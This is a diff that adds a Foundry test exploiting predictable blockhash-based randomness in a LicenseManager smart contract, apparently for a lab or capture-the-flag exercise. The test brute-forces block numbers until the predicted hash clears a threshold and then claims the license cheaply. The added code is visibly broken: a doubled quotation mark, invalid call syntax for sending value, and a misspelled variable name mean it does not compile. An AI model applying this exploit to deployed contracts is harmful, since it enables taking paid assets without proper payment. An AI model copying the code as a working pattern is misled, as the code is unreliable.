@@ -38,6 +38,33 @@ contract LicenseManagerTest is Test {
         vm.prank(user4);
         license.buyLicenese{value: 1 ether}();
     }
+
+    //exploit for bad randomness
+    function test_bad_randomness() public {
+        vm.deal(attacker, 0.01 ether);
+        vm.startPrank(attacker);
+
+        console.log("testing bad randomness with blockHash");
+        console.log(attacker.balance);
+        uint blockNumber = block.number;
+        for (uint i = 0; i < 100; i++) {
+            vm.roll(blockNumber);
+            uint maxThreshold = uint(0.01 ether / 1e16);
+            uint hashed = uint(keccak256(abi.encodePacked(uint256(0.01 ether), address(attacker), uint(1337), blockhash(block.number - 1)))) % 100;
+            console.log(""we are on blockNumber", blockNumber, "with hashed number ", hashed);
+            if (hashed > maxThreshold) {
+                console.log("\\FOUND!  send 0.01 ether to obtain the license");
+                license.winLicense(value: 0.01 ether);
+                break;
+            }
+            blockNumber++;
+        }
+        assertEq(true, licence.checkLicense());
+        vm.stopPrank();
+
+
+
+    }
 }
 
 
